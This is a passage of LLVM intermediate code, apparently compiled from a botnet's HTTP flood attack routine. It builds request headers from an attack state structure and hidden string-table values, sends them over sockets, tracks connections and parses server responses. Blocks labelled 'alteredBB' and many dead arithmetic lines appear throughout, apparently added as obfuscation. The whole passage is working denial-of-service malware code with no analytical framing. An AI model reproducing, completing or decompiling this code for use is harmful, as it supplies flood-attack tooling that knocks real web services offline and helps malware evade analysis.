  %4353 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4354 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4355 = call i32 @util_strlen(i8* %4354)
  %4356 = sext i32 %4355 to i64
  %4357 = getelementptr inbounds i8, i8* %4353, i64 %4356
  %4358 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4359 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4358, i32 0, i32 9
  %4360 = getelementptr inbounds [9 x i8], [9 x i8]* %4359, i32 0, i32 0
  %4361 = call i32 @util_strcpy(i8* %4357, i8* %4360)
  %4362 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4363 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4364 = call i32 @util_strlen(i8* %4363)
  %4365 = sext i32 %4364 to i64
  %4366 = getelementptr inbounds i8, i8* %4362, i64 %4365
  %4367 = call i32 @util_strcpy(i8* %4366, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %4368 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4369 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4370 = call i32 @util_strlen(i8* %4369)
  %4371 = sext i32 %4370 to i64
  %4372 = getelementptr inbounds i8, i8* %4368, i64 %4371
  %4373 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4374 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4373, i32 0, i32 6
  %4375 = getelementptr inbounds [257 x i8], [257 x i8]* %4374, i32 0, i32 0
  %4376 = call i32 @util_strcpy(i8* %4372, i8* %4375)
  %4377 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4378 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4379 = call i32 @util_strlen(i8* %4378)
  %4380 = sext i32 %4379 to i64
  %4381 = getelementptr inbounds i8, i8* %4377, i64 %4380
  %4382 = call i32 @util_strcpy(i8* %4381, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %4383 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4384 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4385 = call i32 @util_strlen(i8* %4384)
  %4386 = sext i32 %4385 to i64
  %4387 = getelementptr inbounds i8, i8* %4383, i64 %4386
  %4388 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4389 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4388, i32 0, i32 5
  %4390 = getelementptr inbounds [512 x i8], [512 x i8]* %4389, i32 0, i32 0
  %4391 = call i32 @util_strcpy(i8* %4387, i8* %4390)
  %4392 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4393 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4394 = call i32 @util_strlen(i8* %4393)
  %4395 = sext i32 %4394 to i64
  %4396 = getelementptr inbounds i8, i8* %4392, i64 %4395
  %4397 = call i32 @util_strcpy(i8* %4396, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %4398 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4399 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4400 = call i32 @util_strlen(i8* %4399)
  %4401 = sext i32 %4400 to i64
  %4402 = getelementptr inbounds i8, i8* %4398, i64 %4401
  %4403 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4403, i32 0, i32 7
  %4405 = getelementptr inbounds [129 x i8], [129 x i8]* %4404, i32 0, i32 0
  %4406 = call i32 @util_strcpy(i8* %4402, i8* %4405)
  %4407 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4408 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4409 = call i32 @util_strlen(i8* %4408)
  %4410 = sext i32 %4409 to i64
  %4411 = getelementptr inbounds i8, i8* %4407, i64 %4410
  %4412 = call i32 @util_strcpy(i8* %4411, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 57)
  %4413 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4414 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4415 = call i32 @util_strlen(i8* %4414)
  %4416 = sext i32 %4415 to i64
  %4417 = getelementptr inbounds i8, i8* %4413, i64 %4416
  %4418 = call i8* @table_retrieve_val(i32 57, i32* null)
  %4419 = call i32 @util_strcpy(i8* %4417, i8* %4418)
  call void @table_lock_val(i8 zeroext 57)
  %4420 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4421 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4422 = call i32 @util_strlen(i8* %4421)
  %4423 = sext i32 %4422 to i64
  %4424 = getelementptr inbounds i8, i8* %4420, i64 %4423
  %4425 = call i32 @util_strcpy(i8* %4424, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 58)
  %4426 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4427 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4428 = call i32 @util_strlen(i8* %4427)
  %4429 = sext i32 %4428 to i64
  %4430 = getelementptr inbounds i8, i8* %4426, i64 %4429
  %4431 = call i8* @table_retrieve_val(i32 58, i32* null)
  %4432 = call i32 @util_strcpy(i8* %4430, i8* %4431)
  call void @table_lock_val(i8 zeroext 58)
  %4433 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4434 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4435 = call i32 @util_strlen(i8* %4434)
  %4436 = sext i32 %4435 to i64
  %4437 = getelementptr inbounds i8, i8* %4433, i64 %4436
  %4438 = call i32 @util_strcpy(i8* %4437, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 59)
  %4439 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4440 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4441 = call i32 @util_strlen(i8* %4440)
  %4442 = sext i32 %4441 to i64
  %4443 = getelementptr inbounds i8, i8* %4439, i64 %4442
  %4444 = call i8* @table_retrieve_val(i32 59, i32* null)
  %4445 = call i32 @util_strcpy(i8* %4443, i8* %4444)
  call void @table_lock_val(i8 zeroext 59)
  %4446 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4447 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4448 = call i32 @util_strlen(i8* %4447)
  %4449 = sext i32 %4448 to i64
  %4450 = getelementptr inbounds i8, i8* %4446, i64 %4449
  %4451 = call i32 @util_strcpy(i8* %4450, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %4452 = load i8*, i8** %14, align 8
  %4453 = icmp ne i8* %4452, null
  br label %originalBB121

originalBB125alteredBB:                           ; preds = %originalBB125, %1135
  %4454 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4455 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4454, i32 0, i32 15
  %4456 = load i32, i32* %4455, align 4
  %4457 = icmp sgt i32 %4456, 0
  br label %originalBB125

originalBB129alteredBB:                           ; preds = %originalBB129, %1188
  %4458 = load i32, i32* %10, align 4
  %_130 = sub i32 0, %4458
  %gen131 = add i32 %_130, 1
  %_132 = sub i32 0, %4458
  %gen133 = add i32 %_132, 1
  %_134 = shl i32 %4458, 1
  %_135 = sub i32 %4458, 1
  %gen136 = mul i32 %_135, 1
  %4459 = add nsw i32 %4458, 1
  store i32 %4459, i32* %10, align 4
  br label %originalBB129

originalBB140alteredBB:                           ; preds = %originalBB140, %1223
  %4460 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4461 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4462 = call i32 @util_strlen(i8* %4461)
  %4463 = sext i32 %4462 to i64
  %4464 = getelementptr inbounds i8, i8* %4460, i64 %4463
  %4465 = load i8*, i8** %14, align 8
  %4466 = call i32 @util_strcpy(i8* %4464, i8* %4465)
  br label %originalBB140

originalBB144alteredBB:                           ; preds = %originalBB144, %1264
  %4467 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4468 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4467, i32 0, i32 0
  %4469 = load i32, i32* %4468, align 4
  %4470 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4471 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %4472 = call i32 @util_strlen(i8* %4471)
  %4473 = sext i32 %4472 to i64
  %4474 = call i64 @send(i32 %4469, i8* %4470, i64 %4473, i32 16384)
  %4475 = load i32, i32* %27, align 4
  %4476 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4477 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4476, i32 0, i32 3
  store i32 %4475, i32* %4477, align 4
  %4478 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4479 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4478, i32 0, i32 1
  store i8 6, i8* %4479, align 4
  %4480 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4481 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4480, i32 0, i32 0
  %4482 = load i32, i32* %4481, align 4
  %_145 = shl i32 %4482, 64
  %_146 = sub i32 0, %4482
  %gen147 = add i32 %_146, 64
  %_148 = shl i32 %4482, 64
  %_149 = sub i32 %4482, 64
  %gen150 = mul i32 %_149, 64
  %_151 = sub i32 0, %4482
  %gen152 = add i32 %_151, 64
  %_153 = sub i32 %4482, 64
  %gen154 = mul i32 %_153, 64
  %4483 = srem i32 %4482, 64
  %4484 = zext i32 %4483 to i64
  %_155 = sub i64 0, 1
  %gen156 = add i64 %_155, %4484
  %_157 = sub i64 1, %4484
  %gen158 = mul i64 %_157, %4484
  %_159 = sub i64 0, 1
  %gen160 = add i64 %_159, %4484
  %_161 = sub i64 0, 1
  %gen162 = add i64 %_161, %4484
  %_163 = sub i64 0, 1
  %gen164 = add i64 %_163, %4484
  %_165 = sub i64 0, 1
  %gen166 = add i64 %_165, %4484
  %_167 = sub i64 1, %4484
  %gen168 = mul i64 %_167, %4484
  %_169 = sub i64 1, %4484
  %gen170 = mul i64 %_169, %4484
  %4485 = shl i64 1, %4484
  %4486 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %4487 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4488 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4487, i32 0, i32 0
  %4489 = load i32, i32* %4488, align 4
  %_171 = sub i32 %4489, 64
  %gen172 = mul i32 %_171, 64
  %_173 = sub i32 %4489, 64
  %gen174 = mul i32 %_173, 64
  %4490 = sdiv i32 %4489, 64
  %4491 = sext i32 %4490 to i64
  %4492 = getelementptr inbounds [16 x i64], [16 x i64]* %4486, i64 0, i64 %4491
  %4493 = load i64, i64* %4492, align 8
  %_175 = sub i64 0, %4493
  %gen176 = add i64 %_175, %4485
  %_177 = sub i64 %4493, %4485
  %gen178 = mul i64 %_177, %4485
  %_179 = sub i64 %4493, %4485
  %gen180 = mul i64 %_179, %4485
  %_181 = sub i64 %4493, %4485
  %gen182 = mul i64 %_181, %4485
  %_183 = sub i64 0, %4493
  %gen184 = add i64 %_183, %4485
  %_185 = sub i64 %4493, %4485
  %gen186 = mul i64 %_185, %4485
  %_187 = sub i64 %4493, %4485
  %gen188 = mul i64 %_187, %4485
  %_189 = sub i64 %4493, %4485
  %gen190 = mul i64 %_189, %4485
  %_191 = sub i64 0, %4493
  %gen192 = add i64 %_191, %4485
  %4494 = or i64 %4493, %4485
  store i64 %4494, i64* %4492, align 8
  %4495 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4496 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4495, i32 0, i32 0
  %4497 = load i32, i32* %4496, align 4
  %4498 = load i32, i32* %23, align 4
  %4499 = icmp sgt i32 %4497, %4498
  br label %originalBB144

originalBB196alteredBB:                           ; preds = %originalBB196, %1380
  %4500 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4501 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4500, i32 0, i32 0
  %4502 = load i32, i32* %4501, align 4
  %_197 = sub i32 0, %4502
  %gen198 = add i32 %_197, 1
  %_199 = shl i32 %4502, 1
  %4503 = add nsw i32 %4502, 1
  store i32 %4503, i32* %23, align 4
  br label %originalBB196

originalBB203alteredBB:                           ; preds = %originalBB203, %1401
  br label %originalBB203

originalBB207alteredBB:                           ; preds = %originalBB207, %1418
  %4504 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4505 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4504, i32 0, i32 1
  %4506 = load i8, i8* %4505, align 4
  %4507 = zext i8 %4506 to i32
  %4508 = icmp eq i32 %4507, 10
  br label %originalBB207

originalBB211alteredBB:                           ; preds = %originalBB211, %1473
  %4509 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4510 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4509, i32 0, i32 1
  store i8 0, i8* %4510, align 4
  %4511 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4512 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4511, i32 0, i32 0
  %4513 = load i32, i32* %4512, align 4
  %4514 = call i32 @close(i32 %4513)
  %4515 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4516 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4515, i32 0, i32 0
  store i32 -1, i32* %4516, align 4
  br label %originalBB211

originalBB215alteredBB:                           ; preds = %originalBB215, %1507
  br label %originalBB215

originalBB219alteredBB:                           ; preds = %originalBB219, %1528
  br label %originalBB219

originalBB223alteredBB:                           ; preds = %originalBB223, %1562
  br label %originalBB223

originalBB227alteredBB:                           ; preds = %originalBB227, %1579
  store i32 0, i32* %9, align 4
  br label %originalBB227

originalBB231alteredBB:                           ; preds = %originalBB231, %1627
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %4517 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4518 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4517, i32 0, i32 0
  %4519 = load i32, i32* %4518, align 4
  %4520 = bitcast i32* %35 to i8*
  %4521 = call i32 @getsockopt(i32 %4519, i32 1, i32 4, i8* %4520, i32* %36) #6
  store i32 %4521, i32* %12, align 4
  %4522 = load i32, i32* %35, align 4
  %4523 = icmp eq i32 %4522, 0
  br label %originalBB231

originalBB236alteredBB:                           ; preds = %originalBB236, %1667
  %4524 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %4525 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4526 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4525, i32 0, i32 0
  %4527 = load i32, i32* %4526, align 4
  %_237 = sub i32 %4527, 64
  %gen238 = mul i32 %_237, 64
  %_239 = sub i32 %4527, 64
  %gen240 = mul i32 %_239, 64
  %_241 = shl i32 %4527, 64
  %_242 = sub i32 %4527, 64
  %gen243 = mul i32 %_242, 64
  %_244 = sub i32 0, %4527
  %gen245 = add i32 %_244, 64
  %_246 = shl i32 %4527, 64
  %_247 = sub i32 0, %4527
  %gen248 = add i32 %_247, 64
  %4528 = sdiv i32 %4527, 64
  %4529 = sext i32 %4528 to i64
  %4530 = getelementptr inbounds [16 x i64], [16 x i64]* %4524, i64 0, i64 %4529
  %4531 = load i64, i64* %4530, align 8
  %4532 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4533 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4532, i32 0, i32 0
  %4534 = load i32, i32* %4533, align 4
  %_249 = shl i32 %4534, 64
  %_250 = shl i32 %4534, 64
  %_251 = sub i32 0, %4534
  %gen252 = add i32 %_251, 64
  %_253 = shl i32 %4534, 64
  %_254 = shl i32 %4534, 64
  %4535 = srem i32 %4534, 64
  %4536 = zext i32 %4535 to i64
  %_255 = shl i64 1, %4536
  %_256 = sub i64 0, 1
  %gen257 = add i64 %_256, %4536
  %_258 = sub i64 0, 1
  %gen259 = add i64 %_258, %4536
  %4537 = shl i64 1, %4536
  %_260 = sub i64 %4531, %4537
  %gen261 = mul i64 %_260, %4537
  %_262 = shl i64 %4531, %4537
  %_263 = sub i64 %4531, %4537
  %gen264 = mul i64 %_263, %4537
  %_265 = sub i64 %4531, %4537
  %gen266 = mul i64 %_265, %4537
  %4538 = and i64 %4531, %4537
  %4539 = icmp ne i64 %4538, 0
  br label %originalBB236

originalBB270alteredBB:                           ; preds = %originalBB270, %1724
  %4540 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4541 = load i32, i32* %12, align 4
  %4542 = call i32 @util_memsearch(i8* %4540, i32 %4541, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %4543 = icmp eq i32 %4542, -1
  br label %originalBB270

originalBB274alteredBB:                           ; preds = %originalBB274, %1780
  %4544 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4545 = load i32, i32* %12, align 4
  %4546 = call i8* @table_retrieve_val(i32 69, i32* null)
  %4547 = call i32 @util_stristr(i8* %4544, i32 %4545, i8* %4546)
  store i32 %4547, i32* %38, align 4
  %4548 = load i32, i32* %38, align 4
  %4549 = sext i32 %4548 to i64
  %4550 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4549
  %4551 = load i8, i8* %4550, align 1
  %4552 = sext i8 %4551 to i32
  %4553 = icmp eq i32 %4552, 32
  br label %originalBB274

originalBB278alteredBB:                           ; preds = %originalBB278, %1807
  %4554 = load i32, i32* %38, align 4
  %_279 = shl i32 %4554, 1
  %_280 = sub i32 0, %4554
  %gen281 = add i32 %_280, 1
  %_282 = sub i32 %4554, 1
  %gen283 = mul i32 %_282, 1
  %4555 = add nsw i32 %4554, 1
  store i32 %4555, i32* %38, align 4
  br label %originalBB278

originalBB287alteredBB:                           ; preds = %originalBB287, %1871
  %4556 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4557 = load i32, i32* %12, align 4
  %4558 = call i8* @table_retrieve_val(i32 66, i32* null)
  %4559 = call i32 @util_stristr(i8* %4556, i32 %4557, i8* %4558)
  store i32 %4559, i32* %41, align 4
  %4560 = load i32, i32* %41, align 4
  %4561 = sext i32 %4560 to i64
  %4562 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4561
  %4563 = load i8, i8* %4562, align 1
  %4564 = sext i8 %4563 to i32
  %4565 = icmp eq i32 %4564, 32
  br label %originalBB287

originalBB291alteredBB:                           ; preds = %originalBB291, %1898
  %4566 = load i32, i32* %41, align 4
  %_292 = sub i32 %4566, 1
  %gen293 = mul i32 %_292, 1
  %4567 = add nsw i32 %4566, 1
  store i32 %4567, i32* %41, align 4
  br label %originalBB291

originalBB297alteredBB:                           ; preds = %originalBB297, %1928
  %4568 = load i32, i32* %41, align 4
  %4569 = sext i32 %4568 to i64
  %4570 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4569
  store i8* %4570, i8** %43, align 8
  %4571 = load i32, i32* %42, align 4
  %4572 = icmp sge i32 %4571, 2
  br label %originalBB297

originalBB301alteredBB:                           ; preds = %originalBB301, %1953
  %4573 = load i32, i32* %41, align 4
  %4574 = load i32, i32* %42, align 4
  %_302 = sub i32 %4573, %4574
  %gen303 = mul i32 %_302, %4574
  %_304 = shl i32 %4573, %4574
  %_305 = sub i32 %4573, %4574
  %gen306 = mul i32 %_305, %4574
  %_307 = sub i32 %4573, %4574
  %gen308 = mul i32 %_307, %4574
  %_309 = sub i32 %4573, %4574
  %gen310 = mul i32 %_309, %4574
  %_311 = sub i32 %4573, %4574
  %gen312 = mul i32 %_311, %4574
  %_313 = sub i32 0, %4573
  %gen314 = add i32 %_313, %4574
  %_315 = sub i32 0, %4573
  %gen316 = add i32 %_315, %4574
  %4575 = add nsw i32 %4573, %4574
  %4576 = sext i32 %4575 to i64
  %4577 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4576
  store i8 0, i8* %4577, align 1
  %4578 = load i8*, i8** %43, align 8
  %4579 = load i8*, i8** %43, align 8
  %4580 = call i32 @util_strlen(i8* %4579)
  %4581 = call i8* @table_retrieve_val(i32 67, i32* null)
  %4582 = call i32 @util_stristr(i8* %4578, i32 %4580, i8* %4581)
  %4583 = icmp ne i32 %4582, 0
  br label %originalBB301

originalBB320alteredBB:                           ; preds = %originalBB320, %1984
  br label %originalBB320

originalBB324alteredBB:                           ; preds = %originalBB324, %2001
  br label %originalBB324

originalBB328alteredBB:                           ; preds = %originalBB328, %2018
  %4584 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4585 = load i32, i32* %12, align 4
  %4586 = call i8* @table_retrieve_val(i32 65, i32* null)
  %4587 = call i32 @util_stristr(i8* %4584, i32 %4585, i8* %4586)
  %4588 = icmp ne i32 %4587, -1
  br label %originalBB328

originalBB332alteredBB:                           ; preds = %originalBB332, %2040
  %4589 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4590 = load i32, i32* %12, align 4
  %4591 = call i8* @table_retrieve_val(i32 65, i32* null)
  %4592 = call i32 @util_stristr(i8* %4589, i32 %4590, i8* %4591)
  store i32 %4592, i32* %44, align 4
  %4593 = load i32, i32* %44, align 4
  %4594 = sext i32 %4593 to i64
  %4595 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4594
  %4596 = load i8, i8* %4595, align 1
  %4597 = sext i8 %4596 to i32
  %4598 = icmp eq i32 %4597, 32
  br label %originalBB332

originalBB336alteredBB:                           ; preds = %originalBB336, %2121
  %4599 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4600 = load i32, i32* %37, align 4
  %4601 = sext i32 %4600 to i64
  %4602 = getelementptr inbounds i8, i8* %4599, i64 %4601
  %4603 = load i32, i32* %12, align 4
  %4604 = call i8* @table_retrieve_val(i32 64, i32* null)
  %4605 = call i32 @util_stristr(i8* %4602, i32 %4603, i8* %4604)
  store i32 %4605, i32* %47, align 4
  %4606 = load i32, i32* %37, align 4
  %4607 = load i32, i32* %47, align 4
  %_337 = sub i32 0, %4606
  %gen338 = add i32 %_337, %4607
  %_339 = sub i32 %4606, %4607
  %gen340 = mul i32 %_339, %4607
  %_341 = shl i32 %4606, %4607
  %_342 = shl i32 %4606, %4607
  %4608 = add nsw i32 %4606, %4607
  %4609 = sext i32 %4608 to i64
  %4610 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4609
  %4611 = load i8, i8* %4610, align 1
  %4612 = sext i8 %4611 to i32
  %4613 = icmp eq i32 %4612, 32
  br label %originalBB336

originalBB346alteredBB:                           ; preds = %originalBB346, %2153
  %4614 = load i32, i32* %47, align 4
  %_347 = shl i32 %4614, 1
  %_348 = sub i32 0, %4614
  %gen349 = add i32 %_348, 1
  %4615 = add nsw i32 %4614, 1
  store i32 %4615, i32* %47, align 4
  br label %originalBB346

originalBB353alteredBB:                           ; preds = %originalBB353, %2172
  %4616 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4617 = load i32, i32* %37, align 4
  %4618 = sext i32 %4617 to i64
  %4619 = getelementptr inbounds i8, i8* %4616, i64 %4618
  %4620 = load i32, i32* %47, align 4
  %4621 = sext i32 %4620 to i64
  %4622 = getelementptr inbounds i8, i8* %4619, i64 %4621
  %4623 = load i32, i32* %12, align 4
  %4624 = load i32, i32* %37, align 4
  %_354 = sub i32 %4623, %4624
  %gen355 = mul i32 %_354, %4624
  %_356 = sub i32 %4623, %4624
  %gen357 = mul i32 %_356, %4624
  %_358 = shl i32 %4623, %4624
  %_359 = shl i32 %4623, %4624
  %_360 = sub i32 %4623, %4624
  %gen361 = mul i32 %_360, %4624
  %_362 = sub i32 %4623, %4624
  %gen363 = mul i32 %_362, %4624
  %_364 = sub i32 %4623, %4624
  %gen365 = mul i32 %_364, %4624
  %4625 = sub nsw i32 %4623, %4624
  %4626 = load i32, i32* %47, align 4
  %_366 = sub i32 0, %4625
  %gen367 = add i32 %_366, %4626
  %_368 = sub i32 0, %4625
  %gen369 = add i32 %_368, %4626
  %4627 = sub nsw i32 %4625, %4626
  %4628 = call i32 @util_memsearch(i8* %4622, i32 %4627, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %4628, i32* %48, align 4
  %4629 = load i32, i32* %48, align 4
  %4630 = icmp ne i32 %4629, -1
  br label %originalBB353

originalBB373alteredBB:                           ; preds = %originalBB373, %2230
  %4631 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4632 = load i32, i32* %37, align 4
  %4633 = sext i32 %4632 to i64
  %4634 = getelementptr inbounds i8, i8* %4631, i64 %4633
  %4635 = load i32, i32* %47, align 4
  %4636 = sext i32 %4635 to i64
  %4637 = getelementptr inbounds i8, i8* %4634, i64 %4636
  %4638 = load i32, i32* %12, align 4
  %4639 = load i32, i32* %37, align 4
  %_374 = shl i32 %4638, %4639
  %_375 = sub i32 0, %4638
  %gen376 = add i32 %_375, %4639
  %4640 = sub nsw i32 %4638, %4639
  %4641 = load i32, i32* %47, align 4
  %_377 = sub i32 %4640, %4641
  %gen378 = mul i32 %_377, %4641
  %4642 = sub nsw i32 %4640, %4641
  %4643 = call i32 @util_memsearch(i8* %4637, i32 %4642, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %_379 = sub i32 %4643, 1
  %gen380 = mul i32 %_379, 1
  %_381 = sub i32 0, %4643
  %gen382 = add i32 %_381, 1
  %_383 = shl i32 %4643, 1
  %_384 = shl i32 %4643, 1
  %_385 = shl i32 %4643, 1
  %_386 = sub i32 %4643, 1
  %gen387 = mul i32 %_386, 1
  %4644 = sub nsw i32 %4643, 1
  store i32 %4644, i32* %48, align 4
  br label %originalBB373

originalBB391alteredBB:                           ; preds = %originalBB391, %2261
  %4645 = load i32, i32* %37, align 4
  %4646 = load i32, i32* %47, align 4
  %_392 = sub i32 %4645, %4646
  %gen393 = mul i32 %_392, %4646
  %_394 = sub i32 0, %4645
  %gen395 = add i32 %_394, %4646
  %4647 = add nsw i32 %4645, %4646
  %4648 = load i32, i32* %48, align 4
  %_396 = sub i32 0, %4647
  %gen397 = add i32 %_396, %4648
  %_398 = sub i32 0, %4647
  %gen399 = add i32 %_398, %4648
  %_400 = sub i32 %4647, %4648
  %gen401 = mul i32 %_400, %4648
  %_402 = shl i32 %4647, %4648
  %_403 = sub i32 %4647, %4648
  %gen404 = mul i32 %_403, %4648
  %4649 = add nsw i32 %4647, %4648
  %4650 = sext i32 %4649 to i64
  %4651 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4650
  store i8 0, i8* %4651, align 1
  store i32 0, i32* %10, align 4
  br label %originalBB391

originalBB408alteredBB:                           ; preds = %originalBB408, %2299
  br label %originalBB408

originalBB412alteredBB:                           ; preds = %originalBB412, %2335
  %4652 = load i8*, i8** %49, align 8
  %4653 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4654 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4653, i32 0, i32 16
  %4655 = load i32, i32* %10, align 4
  %4656 = sext i32 %4655 to i64
  %4657 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4654, i64 0, i64 %4656
  %4658 = getelementptr inbounds [128 x i8], [128 x i8]* %4657, i32 0, i32 0
  %4659 = load i32, i32* %50, align 4
  %4660 = call signext i8 @util_strncmp(i8* %4652, i8* %4658, i32 %4659)
  %4661 = icmp ne i8 %4660, 0
  br label %originalBB412

originalBB416alteredBB:                           ; preds = %originalBB416, %2389
  br label %originalBB416

originalBB420alteredBB:                           ; preds = %originalBB420, %2407
  br label %originalBB420

originalBB424alteredBB:                           ; preds = %originalBB424, %2434
  %4662 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4663 = load i32, i32* %12, align 4
  %4664 = call i8* @table_retrieve_val(i32 63, i32* null)
  %4665 = call i32 @util_stristr(i8* %4662, i32 %4663, i8* %4664)
  store i32 %4665, i32* %52, align 4
  %4666 = load i32, i32* %52, align 4
  %4667 = sext i32 %4666 to i64
